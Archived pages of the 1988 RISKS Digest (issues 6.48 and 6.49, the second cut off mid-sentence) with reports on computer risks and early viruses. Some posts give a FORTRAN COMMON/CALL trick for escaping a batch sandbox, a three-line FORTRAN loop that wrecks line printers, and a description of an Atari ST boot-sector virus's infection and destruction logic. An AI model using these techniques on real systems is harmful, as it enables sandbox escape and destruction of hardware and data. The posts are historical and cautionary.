Kevin Driscoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Lazy Lousy Linkers Leave Large Loophole, Let LowLife Lads Loose    
</A>
<DD>
<A HREF="#subj6.1">
Kevin Driscoll
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Verified microprocessor for critical applications
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
Tue, 22 Mar 88 09:25:33 PST
</i><PRE>

The March 14, 1988 ELECTRONIC ENGINEERING TIMES, pps. 54- 60, has a long
story about a British effort to build a completely verified microprocessor
for critical applications.  The story is notable in that it motivates the
effort throughout by calling attention to the possibility of major accidents
involving computer failure.  At the start of the story is a full-page 
illustration depicting a snake with fangs bared, and the lead:

"THE VIPER -- Somewhere - at a nuclear plant, on board a missile, or at a
chemical refinery, it's going to happen: a catastrophic computer-related
disaster.  A growing group of engineers and scientists say it's unavoidable
with today's microprocessors, which they deem inherently unreliable.
Prompted by sense of urgency, they have developed a high-integrity 
processor called ... The Viper.

THE VIPER: DEVELOPERS PUSHED BY IMPENDING SENSE OF DANGER - Roger Woolnough

... John Cullyer, John Kershaw and Clive Pygott of the Royal Signals &amp;
Radar Establishment (RSRE) Computing Division ... make up the team that
has designed the Viper 32-bit microprocessor.  Viper - which takes its name
from "verifiable integrated processor for enhanced reliability" - is the
world's first microprocessor for safety-critical applications.  It's designed
using formal methods and subjected to a lengthy process of formal proof.

... The road that lead to Viper stretches back almost nine years, but the
work began with software rather than hardware.  In the summer of 1979,
Cullyer and his colleagues believed they could firm up the analysis of 
computer programs to detect deeply buried mistakes.  ... By the beginning
of 1983, (they) had applied (static-code analysis) to the examination of 
a number of real military projects. "Put quite simply, we got quite a 
shock," said Cullyer.  "We were very surprised at the mistakes which were
left in software delivered to the British Ministry of Defence.  What also
came out was the fact that some of the problems were due to the
microprocessor chips themselves - not only conventional processors, but also
special-purpose chips.  We found mistakes in things like the fundamental
arithmetic - in the case of one processor, -1 x -1 = -1."

... But are the shortcomings of commercial microprocessors really so serious?
The RSRE team has no doubts on that score, and the substantial literature
it has produced on high-integrity computing spells out many of the dangers
that lurk in today's chips and software.  Says John Kershaw, "It is
questionable whether any computer in general use has ever been fully
specified, in the sense of allowing its response to every possible
combination of inputs and instructions to be predicted.  It is beyond
question that none has ever been fully tested; an exhaustive test of even 
the simplest microprocessor would take billions of years."

(Then followed a lot of material familiar to RISKS readers, but some 
unfamiliar (to me) reports of computer-related accidents:)

...At least one death has apparently been caused by a fault in a computer
program controlling a hospital drug-dispensing machine. ...There are 
two claims for compensation currently going through the US legal system, one
by the widow of a pilot who crashed in an F-16 and the other by the widower
of a patient killed by a faulty intravenous drip machine ...

(A sidebar tells the story of how Viper was verified, using the specification
language LCF-LSM, invented at the University of Cambridge (England) by
Michael Gordon, and a hardware description language called Ella, developed 
at RSRE)

... John Cullyer carried out a proof by hand to show informally that the
major state machine did correspond to the top-level specification, but the
formal proof was a much more extensive exercise.  This was undertaken by
Avra Cohn (of Cambridge).  Cohn's work relied heavily on an automated
theorem prover, and is one of the largest automated proofs ever undertaken.
It took well over a year, and involved more than 1 million primitive
inferences. ... Viper is a simple device from necessity, because a more 
complex architecture would have demanded proofs that are beyond the current
state of the art.

- Jonathan Jacky, University of Washington 

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer rolls give indigestion to voters?
</A>
</H3>
<address>
Dave Horsfall
&lt;<A HREF="mailto:munnari!stcns3.stc.oz.au!dave@uunet.UU.NET ">
munnari!stcns3.stc.oz.au!dave@uunet.UU.NET 
</A>&gt;
</address>
<i>
Tue, 22 Mar 88 09:52:49 est
</i><PRE>

Heard on the news this morning, in the wake of the NSW State election, that
a "computer error" caused a number of voters in the Bligh electorate being
registered to vote in the adjoining McKell electorate instead.  The Bligh
electorate was a hotly contested one, with an independant candidate tipped
to unseat the incumbent.

(Note for non-Aussie readers - Aussie elections are still done manually, with
ticks or numbers placed on a page, but electorate rolls come from a database.
I get the giggles whenever I read about those American contraptions!)

Dave Horsfall, Alcatel-STC Australia, dave@stcns3.stc.oz
dave%stcns3.stc.OZ.AU@uunet.UU.NET, ...munnari!stcns3.stc.OZ.AU!dave

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: "NEW" Amiga virus has arrived in Europe
</A>
</H3>
<address>
Harv Laser
&lt;<A HREF="mailto:hrlaser@pnet02.cts.com ">
hrlaser@pnet02.cts.com 
</A>&gt;
</address>
<i>
15 Mar 88 07:20:42 GMT
</i><PRE>
Organization: People-Net [pnet02], Redondo Beach, CA.

The following message describes a new virus that has appeared on the
Commodore Amiga.  The important points for Risks readers are:

  1. Like the MacMag virus, this Amiga virus ( the "Byte Bandit virus" )
     has infected commercial disks.

  2. Unlike previous Amiga virus strains, this one is harmful, crashing
     the machine.

I have edited the original some, my edits are noted in braces {}.

Scott Norton   4526P@NAVPGS.BITNET   4526P@NPS.ARPA

    --------------------------Original message-------------------------

Cross posted from the AmigaZone (on PeopleLink) this is one man's
experience with the Byte Bandit virus.  Me, I've never seen the thing
myself, only the SCA variety.  I've got a ring of garlic cloves around
my hard drive for now.....

    --------------------------[begin cross post]------------------------

                                                        February 29, 1987

Just got the Byte Bandit Virus from a commercial disk, straight out of the
box.

This is one nasty virus so I thought I would put up some of the features of
this virus that maybe you don't already know about.

{ ... }

2. IT IS NOT NECCESSARY TO BOOT FROM A DISK, FOR THAT DISK TO BECOME INFECTED!
   That is, ANY write enabled disk will become infected as soon as it is
   inserted  into ANY drive.  That's right, just inserting a write enabled
   disk in df1:  will cause that disk to become infected!!!!

3. The virus, once in the computer, will survive a warm boot and will still
   infect disks upon boot up.

4. VCheck1.2 will not detect infected disks.

5. VCheck1.2 will not detect infected computers.

6. If your machine is infected then re-installing an infected disk WILL NOT
   cure it because as soon as it is installed (Healed) it will be RE-INFECTED.
  {"INSTALL" is the AmigaDOS command to write a boot block on a disk - SAN }

7. VirusX will recognize non-standard boot blocks such as the Byte Bandit
   virus BUT NOT ALWAYS. If your machine is already infected and you put an
   infected disk in any drive and that infected disk is write-enabled, VirusX
   will NOT detect it!!! Otherwise VirusX will recognize it as a non-standard
   boot block.

{ ... }

9. There is a very complicated countdown mechanism within the virus that keeps
   track of how a particular disk became infected.
   { ... }

I see this virus as being much more potent and contagious than the SCA virus.
This one was created to be destructive, and can be IF we are not careful.
A program like VirusX 1.01 that will detect non standard boot blocks is
helpful, but not infallible. I usually run my system from a recoverable
ram disk that contains my entire workbench disk. Every thing is assigned
to the ram disk so that I don't need my workbench disk in any drive. I feel
relitively safe so long as I know that my boot disk is clean. VirusX caught
that commercial disk as soon as I inserted it in df1:, I became suspicious
and checked it out. So long as a program can be run from my workbench then
I would feel safe. If it becomes neccessary to boot from another disk then
it would be wise to either know that the boot disk is clean or power down
after using. If you have to write to other disks then always be sure that
they have not become infected.

                                                       March 4, 1988

Here's  some more info on the new Byte Bandit virus.  As I told you before,
I  received this virus on a commercial disk, straight out of the box, direct
from the manufacturer.


Virus caused crashes.

   In  my  last  note I stated that the virus causes the Amiga to crash
within  10  minutes  every  time.  This is not quite true.  A newly infected
machine  will  NOT crash period.  (as far as I can tell.  Future generations
of  the  self  replicated  virus  as  it  is passed onto other disks may act
differently)  From  the tests I have performed with this virus it would seem
that  an  infected  machine  will  not  crash UNTIL the virus has replicated
itself  TWICE  by  FIRST DEGREE INFECTION.(I call first degree infection the
infection  of  another  disk  by  re-booting  an  infected  machine  with  a
write-enabled  boot  disk.  The boot disk receives a first degree infection)
After  the  second  disk  has been infected the machine will run for about 5
minutes  30  seconds  before  crashing  with  a  solid  blue screen.  I have
reproduced this effect many times with different generations of the virus.

   The  virus  may  be passed on many times by second degree infection,
without  any  effect  on  the source computer.  Second degree infection is
infection  by inserting ANY WRITE-ENABLED DISK into ANY DRIVE of an infected
machine  WHILE it is already running.  The inserted disk will receive second
degree infection.

{ ... }

Dave Crane

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"Drive by wire" autos in development
</A>
</H3>
<address>
jon%uwafrodo.bitnet@uwavm.acs.washington.edu 
&lt;<A HREF="mailto:Jonathan Jacky">
Jonathan Jacky
</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 23 Mar 88 08:38:38 PST

The following story appears in RESEARCH AND DEVELOPMENT, March 1988, p.41:

FLY-BY-WIRE TECHNIQUES ARE BEING ADAPTED FOR AUTOMOBILE CONTROLS
by Irwin Stambler

"Fly-by-wire techniques, where electrical signals rather than mechanical
linkages or hydraulic components are used to actuate controls in airplanes,
are finding a new area of application - automobiles.

One of the latest advances in this area is a sophisticaed steer-by-wire
algorithm devised by researchers at Univ. of Southern California, Los
Angeles, that is being tested in an experimental computerized car built
by General Motors Corp., Detroit, MI.

Dr. Petrous Ioannou, of USC's School of Engineering, said that the use of
a variety of drive-by-wire systems in automobiles is nearer at hand than
most people think.

'Recently BMW in West Germany introduced a V-12 drive-by-wire automobile.
Now that one company has replaced hydraulic components with electrical
ones, the door may be open for many others to follow suit,' he told R&amp;D.

The use of computer-controlled steer-by-wire systems offers a number of
advantages. "The result would be a car that's significantly lighter...",
he said. "A steer-by-wire system would be considerably more responsive and
maneuverable."

Ioannou and a team of graduate students are in the third year of a five-
year program funded by the National Science Foundation to develop automotive
control algorithms.  The first part of the work involved computer
simulation, and the researchers are now collecting data on how the algorithm
works in the GM test car.

"That car contains and electrical motor connected to a computer which, in
turn, receives signals from the steering column. ..." The USC algorithm
measures the velocity and and position of a steering section pinion.
"Data are examined and the algorithm determines a voltage instruction to the
computer to insure that the output of the motor follows a certain pattern.
The computer then calculates the forces required to insure [sic] that
commands are properly carried out."

One important requirement in this application is that the system responds
rapidly in situations where a driver needs to perform a sudden maneuver,
such as to avoid a collision.  "For a sudden turn, the algorithm must be able
to determine the required electrical outputs extremely fast, and the system
must respond very quickly as well."

"We plan to get into braking and other control functions.  We don't see this
as involving any radical change from what we already have," Ioannou said.

(end of excerpts)

This article reminded me of a discussion of the possibility of drive-by-wire 
in RISKS about a year ago.  As I recall, many people pointed out that
fly-by-wire aircraft cost on the order of 1000 times as much as autos, and
are subject to much more intensive maintenance.  By the way, can anyone 
confirm Ioannou's statement that BMW has a drive-by-wire car on the market?

Jonathan Jacky, University of Washington

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
The COMMON Code Virus
</A>
</H3>
<address>
Kevin Driscoll
&lt;<A HREF="mailto:umn-cs!srcsip!driscoll@rutgers.edu ">
umn-cs!srcsip!driscoll@rutgers.edu 
</A>&gt;
</address>
<i>
Sun, 20 Mar 88 13:17:30 CST
</i><PRE>

In Risk Digest 6.46 Ewan Tempero writes:
&gt;&gt;&gt; What was interesting about this was that problems occurred in May 1986.  I
&gt;&gt;&gt; had no idea that the computer virus had been around that long nor that it

My first encounter with a computer virus (definition:  a software parasite that
replicates itself to a new location) was a quarter of a century ago.  I assume
that the basic concept is even older.  This virus was the first of the COMMON
code abuses that I wrote about earlier.  The virus was the single instruction:
		MOVE (Program Counter) --&gt; Program Counter + 1
It had the effect of copying itself to the next memory location, which was
then executed . . .  At the top of memory, the Program Counter rolled over to
zero.  Thus, in a matter of milliseconds, the entire memory contained just
copies of this instruction (no memory protection in those days).  This had an
interesting symptom on the control panel.  The normal random-like pattern of
the address lights became the distinct binary counter pattern.  Because every
memory cell was overwritten by this process, it left no clues about its origin.
(Was this the first single cell computer virus?)
    Like any virus, the computer virus needs population contact in order to
spread.  "In the old days", computers were relatively isolated so viruses were
contained to single computer sites.  Today, with networks, bulletin boards,
and the wide spread sharing of storage media, the spread of viruses has become
a major problem.
   The concept of a "clean room" for computers may have to take on a software
as well as a hardware meaning.
				COMPUTER ROOM
				  No Smoking
				   No Food
			      No External Media

   [And there is no cure for the COMMON code.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Lazy Lousy Linkers Leave Large Loophole, Let LowLife Lads Loose
</A>
</H3>
<address>
Kevin Driscoll
&lt;<A HREF="mailto:umn-cs!srcsip!driscoll@rutgers.edu ">
umn-cs!srcsip!driscoll@rutgers.edu 
</A>&gt;
</address>
<i>
Sat, 19 Mar 88 11:00:19 CST
</i><PRE>

The recent discussion of linkers reminded me of the following:
   In the mid 1960s the university in my home town had an IBM 360 that was
used for both administration and student programming courses.  Realizing the
potentional problems, the administration restricted the student access to
punched card Fortran programs.  Once an hour, all the student decks were run
through a batch compile-and-execute which made sure that these programs did
not do anything unsafe.  This scheme was bypasssed with:
      COMMON /IT/I(1000)
      (fill array I with the integer equivalent of nefarious machine code)
      CALL IT
The compiler made IT an external symbol when it saw the COMMON statement.  The
compiler then saw that IT was an external symbol in the CALL statement; so it
left the resolution to the linker.  The linker, not having any type checking,
simply put the COMMON address in as the target of the CALL.  After getting the
operating system's microfiche documentation, the students could make the code in
COMMON a starting point for anything they wanted to do.
(Nothing made the system more sick than the COMMON code.)

On the subject of pilots' reliance on avionics computers -- some pilots, in
addition to relying on computers to give them information on the current
situation, also seem to use the computers as a replacement for their memory.
     "What altitude are we supposed to be flying at?"
     "I dunno, check the computer."
This was not the originally intended, nor currently sanctioned, use for this
equipment.  But, if this is the way it is sometimes used, does this equipment
have to be built with the increased reliability needed for this unsanction use?

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.47.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.49.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-84</DOCNO>
<DOCOLDNO>IA012-000129-B044-105</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.49.html 128.240.150.127 19970217020249 text/html 27695
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:01:15 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 49</TITLE>
<LINK REL="Prev" HREF="/Risks/6.48.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.50.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 49</H1>
<H2>  Sunday 27 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks of loss of privacy from stolen computer 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Things that go POOF! in the night 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Virtuous Virus Language 
</A>
<DD>
<A HREF="#subj3.1">
Vin McLellan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Batch Viruses 
</A>
<DD>
<A HREF="#subj4.1">
Brian M. Clapper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Atari ST Virus 
</A>
<DD>
<A HREF="#subj5.1">
Chris Allen via Martin Minow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Rhine floods Communication link; Nightmare Virus Construction Set;    CCC hackers revenge threat 
</A>
<DD>
<A HREF="#subj6.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The Anti-Virus Business, or, This Generation's Snake-Oil? 
</A>
<DD>
<A HREF="#subj7.1">
TMP Lee
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks of loss of privacy from stolen computer
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Fri 25 Mar 88 09:51:03-PST
</i><PRE>

A thief made off with a $9,000 computer and printer from an office in Walnut
Creek CA, and discovered that his victim (Beth Savano) was a tax preparer.
In a remarkable display of good will, he returned to her 20 floppy disks
containing 150 tax returns that had been stored on the original hard disks.
However, he kept the original hard disk.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Things that go POOF! in the night
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Fri 25 Mar 88 10:01:24-PST
</i><PRE>

The latest technology in check frauds is the use of a chemical that causes
the checks to disintegrate shortly after being deposited.  Such checks 
have turned up at banks in the Chicago area and in Tennessee, and were
drawn on accounts in California and Tennessee.  Typically a new account was
opened, the bogus check was deposited, and then a withdrawal was made before
the bogus check could bounce.

There are of course some comparable techniques in computer systems, using
Trojan horses, time bombs, etc., for data or a program to alter its own state.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Virtuous Virus Language
</A>
</H3>
<address>
"Vin McLellan" 
&lt;<A HREF="mailto:SIDNEY.G.VIN%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU">
SIDNEY.G.VIN%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Thu 24 Mar 88 03:33:20-EST
</i><PRE>

All of us with a taste for technical history doubtless enjoyed Kevin Driscoll's
charming recollection (Risks 6.48) of a 20 year old memory-crunching parasite
in COMMON code he labelled a virus. What he described, however, sounds like
what the Apple II community in the early '80s widely circulated and described
as "worm" code. The Apple worms, like Dirscoll's code-critter, were simply
memory crunchers who rewrote themselves successively through the memory
(although some had neat graphics of the worm nibbling up the screen and off
into memory.) The Apple worms were, despite an identical name, quite different
from the "worm" created by Huff et al at Xerox Corporation in 1980; and
everything falls far short of the fictional "worm" described by the novelist
John Brunner in a 1975 novel.

Anyone with a report of an virus that was an actual ancestor to Fred Cohen's
1984 creation at USC -- christened "virus" by Ken Adeleman of RSA fame, one of
Cohen's mentors at USC -- could make a welcome addition to the literature by
describing it. (Cohen's creation was first described at a 1985 IFIPS conference
in Toronto.) Several reports of the NSA's reaction to Cohen's paper clearly
indicate that this was a new threat to the Fort Meade spooks who guard the US
government's most secure systems, but there may have been prior art unreported
somewhere.

I haven't yet heard any such tale. I have, however, received many calls from
journalists who have been told by respected computer security mavens that this
is a decades-old problem. A lot of people who should know better seem to
believe, like Driscoll, that any self-replicating program that moves itself to
a new location in memory is a "virus." Obviously few have read Cohen. The
widely-described IBM "virus" in VNET and Bitnet last December was not, for
instance, a "virus."

Let's get it straight, folks! A virus is defined by its capability for epidemic
contagion. It's a parasite program that attaches itself to another program,
effectively turning its victim into a "torjan" which, when executed, seeks out
a particular, targeted, pattern of code in any available potential victims
(programs) to attach a copy of itself ("infect" them) and make them too
"carriers." The virus is merely a medium for contagion; its undeclared mission
or task is in other code piggybacked upon it. (Cohen's formal description also
emphasizes that a virus can be designed to evolve -- change its form or target
-- over generations.)

The damn things are going to be with us for a long time, and it would be nice
not to lose control of the language as we did with "worms."  Anyone got any
*relevant* ancient history?

Vin McLellan        The Privacy Guild       (617) 426-2487

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Batch Viruses
</A>
</H3>
<address>
Brian M. Clapper
&lt;<A HREF="mailto:clapper@NADC.ARPA ">
clapper@NADC.ARPA 
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 09:28:05 EST
</i><PRE>

Kevin Driscoll's COMMON Code commentaries in RISKS 6.48 reminded me of
a simple and particularly nasty program I encountered while still in
college.  It consisted of 3 lines of FORTRAN:

	10 PRINT 1000
           GOTO 10
      1000 FORMAT ('+', 132*'-')

For those who may not remember, in FORTRAN, a '+' in the first column
is carriage control for an overstrike.  This small program continually
overstrikes 132 dashes on a line printer.  Needless to say, if it runs
long enough, it can do a fair amount of damage.  I was amazed at its
simplicity.  I made the mistake of mentioning it to a supposedly
trustworthy fellow student, one who I thought would share my amaze-
ment.  He did share the amazement, but he took the matter one step
further:  He typed it in, submitted a batch job to run it, and directed
the output to a high-speed line printer.  When he specified the printer
id, he made an error, and the output was sent to an unsupervised line
printer in the staff area of the computer center rather than to a
normal, operator-supervised line printer.  The job ran for quite
awhile, and caused untold dollars of damage to the printer.

Obviously, there should have been no way for a student to send any job
to an unsupervised line printer.  Had he sent it to one of the
standard, operator-supervised line printers, one of the operators would
have killed the job soon after it started printing. (Repeated
overstriking on a high-impact line printer has a very distinct sound.
Further, the operators were known to kill jobs which printed out those
fun computer posters we all liked so much in college.)  Still, I
remember thinking at the time that this type of malicious behavior can
be extremely difficult to prevent.  Even the CPU-time restrictions
placed on the typical student job were insufficient, since this program
can do quite a bit of harm in a very short time.  (And it did.)

As I recall, the student was caught.  His punishment was much less
severe than I would have thought.  I think he was denied further access
to the computer building for a few months and had his account taken
away.  The day after the incident, he told me about it in class.  He
was really indignant that the computer center staff had taken away his
account.

Brian M. Clapper, Naval Air Development Center, Warminster, PA

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Atari ST Virus
</A>
</H3>
<address>
Martin Minow THUNDR::MINOW ML3-5/U26 223-9922
&lt;<A HREF="mailto:minow%thundr.DEC@decwrl.dec.com ">
minow%thundr.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
26 Mar 88 20:48
</i><PRE>

I've attached a long article on an Atari ST virus program, taken from Usenet,
adding a few comments (* in column 1) explaining Atari-specific terms.
Now, all of the popular personal computers have been attacked by viruses.
(It's probably not worth posting as-is to Risks, but you might want to stuff it
in your archives and post a summary.)

Martin.

Newsgroups: comp.sys.atari.st
Path: decwrl!labrea!agate!pasteur!ames!nrl-cmf!mailrus!umix!uunet!mcvax!ukc!reading!onion!minster!SoftEng!john
Subject: The Atari ST `virus'
Posted: 22 Mar 88 15:26:48 GMT
Organization: Department of Computer Science, University of York, England
 
I'm posting this for someone who does not have Usenet access.
 
    		THE ATARI ST VIRUS
		==================
 
This weekend I received a number of pd software disks from a computer store.
I found that three of these contained the 'ST Virus' that has been 
mentioned on the net recently. I did not however discover this until it
had trashed one disk and infected a very large number of disks.
	I have since disassembled the virus and worked out exactly what it
does and I am posting a summary of what I found here.
 
What The Virus Does
===================
 
When the ST is reset or switched on, it reads some information from track 0
sector 0 of the disk in drive A. It is possible to set up that sector so 
that the ST will execute its contents. The virus program is written into
this sector so that it is loaded whenever the ST is booted on the offending
disk. 
	Once loaded into memory the virus locates itself at the end of the 
system disk buffer (address contained at 0x4c2 I think) and attaches itself
to the bios getbpb() function. 
*
* getbpb() returns the operating system parameter block for a disk device.
*
 
	Every time getbpb() is called, the virus is activated. It tests the
disk to see if it contains the virus. If it doesn't then the virus is 
written out to the boot sector and a counter is initialised. 
	If the disk does contain the virus then the counter is incremented.
Once the counter reaches a certain value, random data is written across the
root directory &amp; fat tables for the disk thus making it unusable. The virus
then removes itself from the boot sector of the damaged disk (destroys the
evidence??).
*
* The "fat table" contains the bitmap of unused sectors.
*

NOTES
=====
 
Once the virus is installed in the ST it will copy itself to EVERY non write
protected disk that you use - EVEN IF YOU ONLY DO A DIRECTORY - or open a
window to it from the desktop.
 
The virus CANNOT copy itself to a write-protected disk.
 
I *think* (but am not certain) that it survives a reset.
 
The current virus does not affect hard disks (it uses the flopwr() call).
*
* flopwr() writes a sector on a floppy disk (drives A or B).
*
However, if you are using an auto-boot hard disk such as Supra, and the disk
in drive A contains the virus, THE FLOPPY BOOT SECTOR IS EXECUTED BEFORE THE
HARD DISK BOOT SECTOR and consequently the virus will  still be loaded and
transferred to every floppy that you use.
 
THE CURE
========
 
 To test for the virus, look at sector 0 of a floppy with a disk editor.
If the boot sector is executable then it will contain 60 hex as its first 
byte. Note that a number of games have executable boot sectors as part of their
loading. However if this is the case then they should not load when infected
by the virus.
 
If people are worried about this &amp; haven't been able to get the other killer
(I have not seen it yet) then I will post the source/object for a simple
virus detector/killer that I have written.
 
OTHER VIRUSES
=============
 
It would appear that this virus is not the end of the story. I have heard
that there is a new virus around. This one is almost impossible to detect
as for each disk inserted, it scans for any *.prg and appends itself to the 
text segment in some way. Thus it is very difficult to tell whether or not
the virus is actually on a disk.....
 
FINALLY
=======
 
Use those write-protect tabs!
Check all new disks!
Hopefully we can get rid of this virus totally before it damages something
important.
 
	Chris Allen.

If you want any information, etc etc mail me at:
 
Janet:	CJA1@uk.ac.york.vaxa
uucp:	...!uunet!mcvax!ukc!minster!CJA1@VAXA
arpa:	CJA1%vaxa.york.ac.uk@mss.cs.ucl.ac.uk
 
</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
RISK FORUM: 1. Rhine floods Communication link
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
March 24, 1988
</i><PRE>
                     2. Nightmare Virus Construction Set
                     3. CCC hackers revenge threat
Organisation: University of Hamburg, FRG, Faculty for Informatics

1. DATEX-P based international computer communication 2 days
   out-of-operation due to Rhine flood:

Access from some West German computers to several networks broke down for 2
days when the Rhine river overflooded its banks after heavy rain falls and
sudden snow smelting. The flood damaged the DATEX-P network of German Post
(dbp) at Bonn.  According to Hamburg protocols, the central node XPS.GMD.DBP
was unavailable since March 22, 8.55 (first error message, after last
successful transfer on March 21 at 7.10 pm) and the first sucessful transfer on
March 23 at 7.22 pm; officially, the network was declared available on March 24
at 2 am.  Most German universities and research institutes use this node
XPS.GMD.DBP (via their connection to GMD's central distribution computer)
exclusively for communication with EDU, COM and other networks.  During the
breakdown, only EARN and BITNET communication was available for `some time
period' (duration unspecified). Receipt of RISK-FORUM editions and this message
has also been delayed.


2. `Nightmare Software' and the CeBIT Hannover Fair:

Many discussions at the Hannover Fair, labelled "Center for Bureau and
Information Technologies" (CeBIT), held in Hannover, FR Germany this year on
March 16-23 and said to be the world's largest fair in Information and
Communication Technologies, were about Computer-related Risks.  A special
section had been devoted to "Secure Computer Centers", demonstrating building
security measures (TV-cameras, access control with chip cards etc) as well as
some ACF software on PC.  Some enterprises and the German computer trader
COMPAREX exhibited `warm' and `cold' backup computer concepts, and some
publications informed on `Vulnerability of Information Economy' (including an
article of this author, in the German edition of `Computerweek', which is
available by e-mail, on demand, to interested people).

After some (often badly informed) articles on `Viruses' in public newsmedia
(where the `Israel Virus' of Hebrew University was reported to spread over
international computer networks), many people share the fear of `computer
illnesses'.  One respected German newspaper (FAZ=Frankfurter Allgemeine
Zeitung, which often represents official positions) published in its
